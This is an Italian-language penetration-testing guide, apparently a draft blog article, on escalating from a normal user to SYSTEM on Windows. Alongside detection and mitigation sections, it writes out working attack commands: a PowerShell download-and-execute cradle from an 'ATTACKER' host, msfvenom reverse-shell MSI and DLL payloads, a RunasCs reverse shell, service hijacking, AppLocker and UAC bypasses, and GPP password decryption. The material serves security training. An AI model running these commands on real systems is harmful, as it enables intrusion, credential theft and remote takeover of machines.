---
title: 'Windows Privilege Escalation : Tecniche e Tool per Ottenere SYSTEM'
slug: privilege-escalation-windows
description: 'Guida alla privilege escalation su Windows: enumerazione, servizi vulnerabili, token impersonation, DLL hijacking, UAC bypass, detection e mitigazioni.'
image: /privilege-escalation-windows-da-user-a-system.webp
draft: true
date: 2026-07-20T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - privilege escalation
  - post exploitation
  - windows services
  - uac bypass
featured: true
---

# Privilege Escalation su Windows: Tecniche per Ottenere SYSTEM

La privilege escalation locale su Windows sfrutta misconfigurazioni di servizi, permessi errati su file/registry, token impersonation e vulnerabilità note per scalare da utente non privilegiato a SYSTEM o Administrator. È il passo obbligato dopo qualsiasi foothold su una macchina Windows.

***

Su qualsiasi macchina Windows compromessa, il primo obiettivo dopo l'accesso è diventare SYSTEM o local Administrator. Non perché sia sempre necessario per l'obiettivo dell'engagement, ma perché solo con quel livello di accesso puoi estrarre credenziali da LSASS (vedi [Mimikatz](https://hackita.it/articoli/mimikatz/)), installare software e avere controllo completo della macchina per il pivot successivo.

**Administrator vs SYSTEM:** Administrator è un account con privilegi elevati ma comunque soggetto ad alcune restrizioni (UAC, alcuni processi protetti); SYSTEM è l'account con cui gira il kernel stesso e ha accesso pieno, incluso l'accesso diretto a LSASS senza restrizioni aggiuntive.

La maggior parte delle PE trovate nei pentest reali sono misconfigurazioni banali — unquoted service path, cartelle scrivibili, AlwaysInstallElevated — non exploit kernel zero-day. Il flusso corretto è: enumerazione automatica → analisi manuale dei risultati → exploit del vettore più affidabile, riservando i kernel exploit come ultima risorsa.

Classificato da MITRE ATT\&CK principalmente come [T1068](https://attack.mitre.org/techniques/T1068/) (Exploitation for Privilege Escalation) e [T1134](https://attack.mitre.org/techniques/T1134/) (Access Token Manipulation), oltre a T1543.003 (Create or Modify System Process: Windows Service), T1574.001 (DLL Search Order Hijacking), T1548.002 (Bypass User Account Control) e T1053.005 (Scheduled Task).

***

## Da Dove Cominciare in Base all'Accesso che Hai

| Contesto iniziale                            | Controllo prioritario                                              |
| -------------------------------------------- | ------------------------------------------------------------------ |
| Utente standard                              | Servizi, ACL su file/registry, scheduled task, credenziali salvate |
| Service account (IIS, MSSQL, ecc.)           | Token e SeImpersonatePrivilege                                     |
| Local Administrator con token filtrato (UAC) | Integrity level e UAC bypass                                       |
| Sistema non aggiornato                       | Vulnerabilità kernel/patch applicabili                             |
| Directory applicativa scrivibile             | DLL hijacking e binary replacement                                 |
| Privilegi speciali presenti (whoami /priv)   | SeBackup, SeRestore, SeDebug, SeLoadDriver                         |

***

## Cheat Sheet — Privilege Escalation Windows

| Vettore                   | Requisito                                | Tool                                 | MITRE     |
| ------------------------- | ---------------------------------------- | ------------------------------------ | --------- |
| SeImpersonatePrivilege    | Service account / IIS / MSSQL            | PrintSpoofer, GodPotato, SweetPotato | T1134     |
| SeBackupPrivilege         | Account con backup rights                | Backup SAM/NTDS offline              | T1134     |
| SeDebugPrivilege          | Admin senza SYSTEM                       | Mimikatz, LSASS dump                 | T1134     |
| Unquoted service path     | Spazio nel path non quotato              | Binario custom in path intermedio    | T1574     |
| Weak service ACL          | Servizio scrivibile                      | sc.exe config → exec custom          | T1543.003 |
| DLL hijacking             | DLL mancante in path scrivibile          | Custom DLL                           | T1574.001 |
| AlwaysInstallElevated     | Entrambe le chiavi registry = 1          | MSI payload                          | T1548     |
| Scheduled task scrivibile | Task binary scrivibile                   | Sostituzione binario                 | T1053.005 |
| UAC bypass                | Utente già Administrator, token filtrato | Fodhelper, UACME                     | T1548.002 |

***

## Enumerazione Automatica

Prima della ricerca manuale, lancia i tool automatici — coprono rapidamente i vettori più comuni.

```powershell
# WinPEAS — enumerazione completa e colorata
.\winPEASx64.exe

# PrivescCheck — alternativa PowerShell nativa, molto usata
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck

# SharpUp — solo privilege escalation paths
.\SharpUp.exe audit

# PowerUp — framework PowerShell dedicato
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerUp.ps1')
Invoke-AllChecks

# Seatbelt — situational awareness + PE
.\Seatbelt.exe -group=all
```

Vedi: [WinPEAS](https://hackita.it/articoli/winpeas/), [Seatbelt](https://hackita.it/articoli/seatbelt/), [SharpUp](https://hackita.it/articoli/sharpup/).

***

## Enumerazione delle Difese Attive Prima di Agire

Prima di lanciare i tool automatici visti sopra o qualsiasi payload custom, conviene sapere cosa è già attivo a difendere la macchina. Defender, AppLocker, WDAC, il Firewall e la Language Mode di PowerShell determinano quali tecniche sono praticabili e quali verranno bloccate o loggate immediatamente. Eseguire WinPEAS o un payload msfvenom generico contro un endpoint con AppLocker in enforcement e Defender attivo, senza prima aver capito cosa è permesso, significa quasi certamente un alert immediato.

**Logica di enumerazione:**

1. Censisci cosa è attivo (Defender, AppLocker/WDAC, Firewall, Language Mode)
2. Trova i percorsi che AppLocker considera "trusted" (regole Allow)
3. Verifica se puoi scrivere in quei percorsi
4. Cerca certificati disponibili per firmare codice, se serve bypassare controlli basati su firma
5. Cerca task/servizi che girano con utenti privilegiati, da correlare con quanto emerso ai punti precedenti — questo si ricollega direttamente alla sezione Scheduled Tasks più avanti in questo articolo

### Microsoft Defender

```powershell
Get-MpComputerStatus | Select-Object AMRunningMode, RealTimeProtectionEnabled
```

`RealTimeProtectionEnabled = True` significa che qualsiasi binario scritto su disco viene scansionato all'atto della scrittura/esecuzione — un tool noto come WinPEAS o un payload msfvenom generico verrà quasi certamente intercettato.

```cmd
:: Verifica rapida via service control
sc query windefend

:: Enumerazione generica di qualsiasi prodotto AV registrato (non solo Defender)
wmic /namespace:\\root\securitycenter2 path antivirusproduct get displayName
```

### AppLocker

```powershell
# Stato enforcement per categoria di regola
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections | Select-Object RuleCollectionType, EnforcementMode

# Regole complete (verbose) — utile per vedere ogni singola condizione
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections | Format-List

# Solo le regole Allow — sono i percorsi/publisher che puoi sfruttare
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections | Format-List | Out-String | Select-String "Allow"

# Export XML completo, più comodo da rileggere offline
Get-AppLockerPolicy -Effective -Xml
```

```cmd
:: Equivalente registry, utile se i cmdlet AppLocker non sono disponibili
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2
```

**Percorsi comunemente whitelistati da AppLocker.** Le policy di default spesso permettono l'esecuzione di qualsiasi cosa dentro `C:\Windows` o `C:\Program Files`, assumendo che siano percorsi sotto controllo amministrativo. Il problema: esistono sottodirectory scrivibili anche da utenti non privilegiati proprio dentro questi percorsi "fidati":

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\Tasks
C:\Windows\SysWOW64\Tasks
C:\Windows\Tasks
C:\Windows\Registration\CRMLog
C:\Windows\System32\com\dmp
C:\Windows\System32\FxsTmp
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\FxsTmp
C:\Windows\Temp
C:\Windows\Tracing
```

Se AppLocker permette l'esecuzione generica da `C:\Windows` senza escludere queste sottodirectory, un binario copiato in una di queste posizioni viene eseguito senza violare la policy. Verifica sempre la scrivibilità effettiva prima di fare affidamento su uno di questi path, perché varia da ambiente ad ambiente:

```cmd
icacls "C:\Windows\Tasks"
```

Altri bypass concettuali documentati per AppLocker, da verificare caso per caso rispetto alla policy effettiva del target:

* **Regole path-based troppo permissive** — una regola come `%OSDRIVE%*\allowed*` permette di creare una cartella chiamata `allowed` ovunque sul disco e farla considerare fidata
* **Binari PowerShell alternativi** — molte policy bloccano solo `%System32%\WindowsPowerShell\v1.0\powershell.exe`, dimenticando `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` o `PowerShell_ISE.exe`
* **LOLBins** — binari legittimi già firmati e whitelistati (vedi [LOLBins](https://hackita.it/articoli/lolbins/)) spesso permettono comunque esecuzione di codice arbitrario nel loro contesto
* **DLL enforcement** — raramente abilitato per il carico prestazionale che comporta, quindi una DLL malevola può spesso girare anche dove gli eseguibili sono bloccati

### WDAC (Windows Defender Application Control)

WDAC è il meccanismo di controllo dell'esecuzione più recente e più granulare rispetto ad AppLocker, spesso enforced insieme o al posto di quest'ultimo.

```cmd
:: Verifica presenza di policy WDAC sul sistema
dir C:\Windows\System32\CodeIntegrity\
```

A differenza di AppLocker, WDAC può essere applicato in modalità che blocca anche l'esecuzione in memoria e l'uso di assembly .NET non firmati — verificare quale dei due controlli (o entrambi) è realmente in enforcement è un passaggio che condiziona pesantemente la scelta della tecnica successiva.

### PowerShell Language Mode

```powershell
$ExecutionContext.SessionState.LanguageMode
```

* `FullLanguage` — nessuna restrizione, tutti i cmdlet e le API .NET sono disponibili
* `ConstrainedLanguage` (CLM) — indica quasi sempre che AppLocker o WDAC sono in enforcement e stanno limitando cosa PowerShell può eseguire (niente `Add-Type`, accesso limitato a molte classi .NET, script offuscati spesso falliscono silenziosamente)

In CLM, molti tool offensivi basati su PowerShell (PowerUp, Invoke-Mimikatz, ecc.) smettono di funzionare correttamente. In questo scenario, comandi equivalenti in puro CMD (come il polling loop descritto più avanti in questo articolo) restano un'alternativa praticabile perché non passano dal motore PowerShell ristretto.

### Firewall

```cmd
netsh advfirewall show allprofiles state
```

Controlla lo stato per ciascun profilo (Domain, Private, Public) — utile per capire se, dopo l'escalation, sarà possibile aprire connessioni in uscita per un reverse shell o se serviranno tecniche di [pivoting](https://hackita.it/articoli/socat/) alternative.

```powershell
# Regole di blocco effettive attualmente applicate
Get-NetFirewallRule -PolicyStore ActiveStore | Where-Object { $_.Action -eq "Block" } | Select-Object DisplayName, Direction
```

### Certificati Disponibili

```powershell
Get-ChildItem Cert:\LocalMachine\ -Recurse
Get-ChildItem Cert:\LocalMachine\My | Select-Object Thumbprint, Subject, HasPrivateKey
Get-ChildItem Cert:\CurrentUser\My
Get-ChildItem Cert:\CurrentUser\ -Recurse
```

Se una policy AppLocker/WDAC è basata su firma del publisher piuttosto che su percorso, un certificato di code-signing disponibile con chiave privata accessibile può permettere di firmare un binario proprio e farlo rientrare nelle regole Allow.

***

## Token Impersonation — SeImpersonatePrivilege

**SeImpersonatePrivilege** è il vettore di PE più comune in ambienti Windows. È assegnato per default a IIS AppPool, service account, SQL Server e altri servizi — e permette di impersonare token SYSTEM tramite tecniche di COM coercion note come Potato attack.

```powershell
# Verifica i propri privilegi
whoami /priv | findstr /i "impersonate assignprimary"
```

### Potato Family — Quando Usare Quale

| Tool             | OS Target indicativo | Requisito              | Note                                                |
| ---------------- | -------------------- | ---------------------- | --------------------------------------------------- |
| **GodPotato**    | Server 2012-2022     | SeImpersonate          | Supporto dichiarato dal progetto fino a Server 2022 |
| **PrintSpoofer** | Win10/Server2016+    | SeImpersonate          | Usa il servizio Print Spooler                       |
| **SweetPotato**  | Win7-Win10           | SeImpersonate/SeAssign | Multi-vector, prova più tecniche                    |
| **RoguePotato**  | Win10/Server2019     | SeImpersonate          | Alternativa quando JuicyPotato non funziona         |
| **EfsPotato**    | Vari                 | SeImpersonate          | Via MS-EFSR (EFS)                                   |

```powershell
# GodPotato
.\GodPotato.exe -cmd "cmd /c whoami"

# PrintSpoofer
.\PrintSpoofer64.exe -i -c "cmd /c whoami"

# SweetPotato — prova più vettori automaticamente
.\SweetPotato.exe -a "cmd.exe /c whoami"
```

L'efficacia di un Potato attack dipende dalla versione di Windows, dai servizi disponibili, dalle patch applicate e dal vettore di coercion usato — non va considerata una tecnica universalmente funzionante, ma un percorso da verificare caso per caso in base al privilegio disponibile.

***

## Verifica dei Kernel Exploit Applicabili

Solo dopo aver escluso le misconfigurazioni più comuni, verifica se esistono CVE kernel applicabili alla build esatta della macchina:

```powershell
# Versione e build esatta prima di tutto
systeminfo | findstr /i "os name os version build"
[System.Environment]::OSVersion.Version

# Watson — identifica CVE applicabili alla versione Windows corrente
.\Watson.exe
```

```bash
# WES-NG da Linux — analizza systeminfo e genera CVE list
python3 wes.py systeminfo.txt --exploits-only -i "Elevation of Privilege"
```

Vedi: [WES-NG](https://hackita.it/articoli/wes-ng/).

Piuttosto che affidarsi a una lista statica di CVE (che invecchia rapidamente), verifica sempre le KB installate rispetto al catalogo [MSRC](https://msrc.microsoft.com/update-guide) e al [CISA KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) per le vulnerabilità note sfruttate attivamente al momento del test. I kernel exploit restano l'ultima risorsa: sono spesso instabili e possono causare crash (BSOD) sulla macchina target.

***

## Service Misconfigurations

### Unquoted Service Paths

I servizi con percorsi non quotati e spazi nel path sono vulnerabili: Windows prova ogni prefisso del path come eseguibile.

```powershell
# PowerShell — metodo consigliato (WMIC è deprecato ed è funzionalità opzionale disabilitata di default nelle build moderne)
Get-CimInstance Win32_Service | Where-Object { $_.PathName -notlike '"*' -and $_.PathName -like '* *' } | Select-Object Name, PathName

# PowerUp
Get-ServiceUnquoted | Select-Object Name, PathName, StartName
```

**Esempio sfruttamento:**

```
Path: C:\Program Files\My Service\MyApp.exe
Windows prova: C:\Program.exe → C:\Program Files\My.exe → C:\Program Files\My Service\MyApp.exe
```

Se `C:\Program Files\` è scrivibile, un binario chiamato `Program.exe` in quella posizione viene eseguito dal servizio come SYSTEM.

### Weak Service Binary e Config Permissions

```powershell
# PowerUp — servizi con binary scrivibile
Get-ModifiableServiceFile | Select-Object ServiceName, Path

# PowerUp — servizi con config modificabile (sc.exe config)
Get-ModifiableService | Select-Object ServiceName

# Manuale — permessi sul binario
icacls "C:\Program Files\VulnerableService\service.exe"

# Manuale — permessi e configurazione del servizio
sc.exe sdshow VulnerableService
sc.exe qc VulnerableService
```

```powershell
# Exploit: sostituzione del binario
Copy-Item .\malicious.exe "C:\Program Files\VulnerableService\service.exe" -Force
sc.exe start VulnerableService

# Exploit: cambio del binpath del servizio
sc.exe config VulnerableService binpath= "C:\temp\malicious.exe"
sc.exe start VulnerableService
```

Per identificare rapidamente servizi con `ImagePath` non standard su tutto il registro:

```powershell
Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" | ForEach-Object { try { (Get-ItemProperty $_.PSPath).ImagePath } catch {} }
```

### Decodifica dei Permessi di un Servizio (SDDL)

`sc.exe sdshow` restituisce i permessi del servizio in formato SDDL (Security Descriptor Definition Language) — una stringa poco leggibile a occhio ma che indica esattamente chi può modificare, avviare o riconfigurare quel servizio.

```cmd
sc.exe sdshow NomeServizio
sc.exe qc NomeServizio
```

L'output SDDL va decodificato per capire se un gruppo con basso privilegio (es. `Authenticated Users`, `Everyone`) ha diritti di scrittura sul servizio. Tool online o script PowerShell dedicati alla decodifica SDDL traducono la stringa in una lista leggibile di trustee e permessi (es. `RPWPDTLOCRRC` per un ACE che include *write property*, *delete*, *change owner*). Se non trovi il servizio per nome, cerca tra tutti gli `ImagePath` non standard:

```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Services" /s /v ImagePath | findstr /i /v "system32 syswow64 microsoft"
```

Una volta identificato un servizio scrivibile via SDDL, l'exploit è lo stesso già descritto sopra: modifica del binpath e restart del servizio.

### Weak Registry Permissions sulla Chiave del Servizio

Distinto dalla scrivibilità del binario o dalla config via `sc.exe`: qui è la chiave di registro del servizio stessa (`HKLM\System\CurrentControlSet\Services\<nome>`) ad avere permessi troppo permissivi, permettendo di riscrivere `ImagePath` direttamente via registro senza passare da `sc.exe config`.

```powershell
# Controlla i permessi sulla chiave di un servizio specifico
Get-Acl HKLM:\System\CurrentControlSet\Services\NomeServizio | Format-List
# Cerca ACE tipo "NT AUTHORITY\INTERACTIVE Allow FullControl" o simili per gruppi a basso privilegio
```

```cmd
:: accesschk (Sysinternals) — equivalente più leggibile
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\NomeServizio
```

Se il gruppo con cui operi ha `FullControl` (o quantomeno scrittura) sulla chiave, puoi riscrivere direttamente `ImagePath`:

```cmd
reg add HKLM\System\CurrentControlSet\Services\NomeServizio /v ImagePath /t REG_EXPAND_SZ /d C:\Windows\Temp\backdoor.exe /f
net start NomeServizio
```

Un caso particolare storicamente sfruttato in questo modo è il servizio `regsvc`/`upnphost` in alcune build legacy, spesso citato come esempio didattico proprio perché la sua chiave di registro risultava scrivibile da gruppi a basso privilegio in configurazioni non hardenate.

### accesschk — Enumerazione Estesa di Permessi Deboli

`accesschk.exe` (Sysinternals) resta lo strumento di riferimento per enumerare in blocco permessi deboli su file, cartelle, servizi e chiavi di registro, più leggibile rispetto a un ciclo manuale di `icacls`:

```cmd
:: Permessi su tutti i servizi per un gruppo specifico
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

:: Cartelle scrivibili da un gruppo, ricorsivo su tutto il disco
accesschk.exe /accepteula -uwdqs "Authenticated Users" C:\
accesschk.exe /accepteula -uwdqs "Everyone" C:\

:: File scrivibili da un gruppo, ricorsivo
accesschk.exe /accepteula -uwqs "Authenticated Users" C:\*.*
```

L'output evidenzia direttamente `RW` o `SERVICE_ALL_ACCESS`/`FILE_ALL_ACCESS` per il trustee interrogato, evitando di dover interpretare manualmente ogni singolo SDDL o ACL.

***

## AlwaysInstallElevated

Se entrambe le chiavi registry sono impostate a 1, qualsiasi MSI viene installato come SYSTEM.

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi -o evil.msi
```

```cmd
msiexec /quiet /qn /i C:\temp\evil.msi
```

***

## DLL Hijacking

Quando un eseguibile cerca una DLL in un percorso scrivibile prima di trovarla in System32:

```powershell
# PowerUp
Find-ProcessDLLHijack | Select-Object ProcessName, Path

# Verifica SafeDllSearchMode
reg query "HKLM\System\CurrentControlSet\Control\Session Manager" /v SafeDllSearchMode
```

Process Monitor (Sysinternals), filtrato su "NAME NOT FOUND" per `.dll`, resta lo strumento più affidabile per osservare in tempo reale quali DLL un processo cerca senza trovarle.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll -o evil.dll
```

```powershell
Copy-Item evil.dll "C:\Program Files\VulnerableApp\missing.dll"
```

***

## Scheduled Tasks e Registry Autoruns

```powershell
# Scheduled task con binario scrivibile
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"} | ForEach-Object {
  $path = $_.Actions.Execute
  if ($path) { icacls $path }
}

# PowerUp
Get-ModifiableScheduledTaskFile | Select-Object TaskName, TaskFilePath

# Registry autoruns con path scrivibile
Get-ModifiableRegistryAutoRun | Select-Object Path, ModifiablePath
```

Vedi articolo dedicato: [Scheduled Task](https://hackita.it/articoli/scheduled-task/).

***

## Enumerazione in Tempo Reale — l'Equivalente di pspy su Windows

Su Linux, [pspy](https://hackita.it/articoli/pspy/) permette di osservare processi lanciati da altri utenti senza privilegi elevati — utile soprattutto per intercettare scheduled task o script eseguiti periodicamente da un account privilegiato. Su Windows non esiste un tool identico, ma lo stesso principio si ottiene con un polling loop in PowerShell o CMD.

```powershell
# Mostra i nuovi processi non appena compaiono
$prev = @()
while($true) {
  $curr = Get-Process | Select-Object -ExpandProperty Name
  $new = $curr | Where-Object { $prev -notcontains $_ }
  if ($new) { $new }
  $prev = $curr
  Start-Sleep 2
}
```

```powershell
# Filtra per un processo specifico (utile per intercettare tool amministrativi lanciati periodicamente)
while($true) {
  Get-Process | Where-Object { $_.Name -like "*bginfo*" -or $_.Name -like "*autoit*" }
  Start-Sleep 2
}
```

```cmd
:: Equivalente in CMD puro — funziona anche in Constrained Language Mode (CLM), dove molti script PowerShell offensivi vengono bloccati
FOR /L %i IN (0,1,1000) DO (tasklist /FI "imagename eq Bginfo64.exe" | findstr /v "No tasks" & ping -n 2 127.0.0.1 > NUL)
```

**Differenza con `schtasks`:** `schtasks /query` mostra i task *programmati* (l'equivalente Windows di crontab), ma non dice se e quando vengono effettivamente eseguiti in quel momento. I loop sopra osservano invece i processi *in esecuzione in tempo reale* — utile per catturare un binario privilegiato nel momento esatto in cui gira, incluso l'utente che lo esegue:

```powershell
# Mostra anche il nome utente proprietario del processo, per un intervallo di tempo definito
$end = (Get-Date).AddMinutes(5)
$prev = @()
while ((Get-Date) -lt $end) {
  $curr = Get-WmiObject Win32_Process | Select-Object Name, CommandLine, @{N='User';E={$_.GetOwner().User}}
  $new = $curr | Where-Object { $prev.Name -notcontains $_.Name }
  if ($new) { $new }
  $prev = $curr
  Start-Sleep 2
}
```

Questa tecnica è particolarmente utile quando un tool automatico (WinPEAS, PowerUp) non segnala nulla di anomalo nei task pianificati, ma si sospetta che un processo privilegiato giri periodicamente al di fuori dello scheduler standard (es. uno script di manutenzione lanciato da un altro servizio).

***

## Credenziali Privilegiate come Percorso Indiretto di Escalation

Autologon, `cmdkey /list`, DPAPI, file XML con password non sono di per sé privilege escalation — sono credential discovery/access. Diventano un vettore di escalation solo quando permettono di autenticarsi come un account con privilegi superiori sulla stessa macchina.

```cmd
:: Credenziali salvate da cmdkey
cmdkey /list
runas /savecred /user:DOMAIN\Administrator "cmd.exe"

:: File di configurazione con credenziali plaintext
type C:\Windows\Panther\Unattend.xml 2>nul
type C:\Windows\system32\sysprep\sysprep.xml 2>nul

:: Ricerca generica di password in file di configurazione
findstr /SIM /C:"pass" *.ini *.cfg *.xml
```

```powershell
# Cerca ImagePath sospetti con pattern di credenziali (es. password passate come parametro)
Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" |
  ForEach-Object { try { (Get-ItemProperty $_.PSPath).ImagePath } catch {} } |
  Select-String -Pattern ' -p |password|pass|cred'
```

```powershell
# RunasCs — esegue comandi con credenziali trovate, senza bisogno di una sessione interattiva
.\RunasCs.exe utente password "cmd /c whoami" -r ATTACKER:4444
```

Vedi anche [Credential Dumping](https://hackita.it/articoli/credential-dumping/), [Mimikatz](https://hackita.it/articoli/mimikatz/), [LaZagne](https://hackita.it/articoli/lazagne/).

### Group Policy Preferences (GPP) — cpassword

Le vecchie Group Policy Preferences permettevano di distribuire credenziali (es. per account amministratore locale) tramite file XML salvati in SYSVOL, cifrati con AES. Il problema: Microsoft ha pubblicato la chiave AES privata sulla propria documentazione, rendendo la cifratura reversibile da chiunque abbia accesso in lettura a SYSVOL — cioè qualsiasi utente di dominio autenticato.

```powershell
# Cerca file XML con cpassword in SYSVOL
findstr /S /I cpassword \\domain.local\sysvol\*.xml
```

```bash
# gpp-decrypt — decifra il cpassword trovato
gpp-decrypt -f groups.xml
gpp-decrypt -c "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"
```

Microsoft ha rilasciato la patch **MS14-025**, che impedisce la creazione di *nuove* GPP con credenziali — ma non rimuove i file XML già esistenti da configurazioni precedenti, motivo per cui questa tecnica resta valida in molti ambienti legacy non ripuliti manualmente. Se la credenziale trovata appartiene a un account amministratore locale distribuito su più macchine (uno scenario comune per questo tipo di GPP), l'accesso ottenuto vale spesso per l'intero parco macchine collegato a quella policy, non solo per l'host corrente.

***

## UAC Bypass

Un UAC bypass **non trasforma un utente standard in Administrator**. Il prerequisito è che l'utente sia già membro del gruppo Administrators ma stia operando con un token filtrato (medium integrity) a causa di UAC — l'obiettivo è ottenere un processo ad alta integrità, non SYSTEM.

```powershell
# Verifica il livello di integrità corrente
whoami /groups | findstr "Mandatory Level"
# Medium Mandatory Level = token filtrato da UAC, pur essendo nel gruppo Administrators
```

```powershell
# Fodhelper — bypass via registry (Windows 10/11, dipende da versione e configurazione)
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start cmd.exe" -Force
Start-Process fodhelper.exe
```

```bash
# UACME — raccolta di metodi di bypass UAC documentati, l'efficacia varia per versione
.\Akagi64.exe 23 C:\temp\payload.exe  # metodo 23 — fodhelper
.\Akagi64.exe 41 C:\temp\payload.exe  # metodo 41 — via Disk Cleanup
```

La same-desktop elevation di UAC non è considerata da Microsoft stessa un confine di sicurezza completo, ma resta comunque un meccanismo di riduzione del rischio da non sottovalutare durante un hardening.

***

## Detection

**Creazione/modifica servizi e task:**

* **Event ID 7045** — installazione di un nuovo servizio (spesso usato per PE via service binary replacement)
* **Event ID 4697** — servizio installato, da monitorare specialmente su host sensibili
* **Event ID 4698** — creazione di uno scheduled task

**Esecuzione processi:**

* **Event ID 4688** o **Sysmon Event ID 1** — process creation con command line completa
* Esecuzione di `PrintSpoofer.exe`, `GodPotato.exe`, `SweetPotato.exe` — firma comportamentale nota agli EDR
* Esecuzione anomala di `fodhelper.exe`, `msiexec.exe`, `sc.exe`, `schtasks.exe` con parent process insolito

**Filesystem e registro:**

* **Sysmon Event ID 11** — creazione/sostituzione file, utile per DLL hijacking e binary replacement
* **Sysmon Event ID 12/13/14** — modifiche al registro, incluso `ImagePath` dei servizi e chiavi `AlwaysInstallElevated`
* **Sysmon Event ID 17/18** — named pipe anomale (rilevante per i Potato attack basati su coercion)

**Segnali comportamentali:**

* Processo figlio ad alta integrità con parent chain insolita
* Caricamento di driver inattesi
* Creazione ed esecuzione immediata di un MSI via `msiexec /quiet`

**Segnali legati all'enumerazione delle difese:**

* **Event Viewer → Applications and Services Logs → Microsoft → Windows → AppLocker** registra ogni evento di blocco o di audit-only, inclusi i tentativi falliti
* L'esecuzione ripetuta di `Get-AppLockerPolicy -Effective` o `Get-MpComputerStatus` da un contesto non amministrativo è un pattern di ricognizione facilmente distinguibile da un uso amministrativo legittimo
* La scrittura di nuovi file dentro le sottodirectory "trusted" elencate sopra (es. `C:\Windows\Tasks`, `C:\Windows\Tracing`) è un segnale ad alto valore, perché in condizioni normali quelle directory ricevono pochissima scrittura da processi non di sistema

Windows Event Forwarding centralizza questa telemetria da più host, rendendo praticabile la correlazione descritta sopra su scala di dominio.

***

## Mitigazione

* **ACL corrette** su servizi, binari, directory e chiavi di registro — nessun servizio dovrebbe avere binario o configurazione scrivibile da utenti non amministrativi
* **Service path sempre tra virgolette** quando contengono spazi
* **Disabilitare AlwaysInstallElevated** salvo necessità documentata
* **Patch regolari** su Windows e software di terze parti, con verifica contro MSRC e CISA KEV
* **Limitare SeImpersonatePrivilege, SeDebugPrivilege** e altri user right sensibili solo agli account che ne hanno reale necessità
* **Rimuovere gli utenti non necessari dagli amministratori locali**
* **Windows LAPS** per la rotazione automatica delle password degli amministratori locali
* **Credential Guard** per isolare i segreti tramite virtualization-based security
* **WDAC o AppLocker** per limitare l'esecuzione di binari, script e MSI non autorizzati
* Account amministrativi su workstation e sessioni separate da quelle usate per attività quotidiane
* Evitare di salvare credenziali privilegiate su endpoint non fidati (file XML, script, cmdkey)
* Le regole AppLocker basate su percorso vanno accompagnate da un audit periodico delle sottodirectory scrivibili all'interno dei percorsi "trusted" (`C:\Windows`, `C:\Program Files`), non assunte come sicure a priori
* Preferire regole AppLocker basate su publisher/firma rispetto a regole puramente path-based, dove possibile
* WDAC in modalità enforced, non solo audit, riduce sensibilmente la superficie lasciata da AppLocker da solo
* Monitorare la Language Mode di PowerShell sugli endpoint: un utente che opera stabilmente in `FullLanguage` su un host dove ci si aspetterebbe `ConstrainedLanguage` indica una policy non applicata correttamente

***

## FAQ

**Qual è la differenza tra Administrator e SYSTEM?**
Administrator è un account con privilegi elevati ma ancora soggetto ad alcune restrizioni di sistema; SYSTEM ha accesso pieno al sistema operativo, incluso l'accesso diretto a LSASS, senza le limitazioni che si applicano anche a un Administrator.

**Quali privilegi permettono una privilege escalation su Windows?**
I principali sono SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeLoadDriverPrivilege e SeTakeOwnershipPrivilege — la loro presenza va sempre verificata con `whoami /priv`.

**Quando funziona un Potato attack?**
Quando il processo corrente dispone di SeImpersonatePrivilege o privilegi equivalenti. L'efficacia della singola tecnica (GodPotato, PrintSpoofer, ecc.) dipende da versione di Windows, patch applicate e servizi disponibili sulla macchina.

**Come rilevo un Unquoted Service Path?**
Con `Get-CimInstance Win32_Service` filtrando i path senza virgolette che contengono uno spazio, oppure con il modulo PowerUp `Get-ServiceUnquoted`.

**WinPEAS esegue automaticamente gli exploit?**
No — WinPEAS enumera e segnala i vettori potenziali, ma non sfrutta nulla in automatico. L'exploitation resta un passo manuale successivo.

**Un UAC bypass funziona da utente standard?**
No. Richiede che l'utente sia già membro del gruppo Administrators; l'obiettivo è ottenere un processo ad alta integrità, non diventare amministratore da un account che non lo è.

***

## Fonti Aggiuntive di Enumerazione

### PowerShell History

PSReadLine salva la cronologia dei comandi PowerShell eseguiti dall'utente corrente in un file di testo — utile per trovare credenziali digitate per errore in chiaro, path di script custom o comandi rivelatori dell'ambiente.

```powershell
type (Get-PSReadlineOption).HistorySavePath
```

### Enumerazione del Contesto di Dominio

Quando la macchina fa parte di un dominio, prima di procedere con la privilege escalation locale conviene raccogliere anche il contesto AD circostante — utile per capire se conviene puntare a un percorso di escalation locale o se è più efficiente muoversi verso l'enumerazione del dominio (vedi [Active Directory](https://hackita.it/articoli/active-directory/)):

```cmd
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
nltest /dclist:
nltest /domain_trusts
net group "Domain Admins" /domain
```

### Event Log Mining

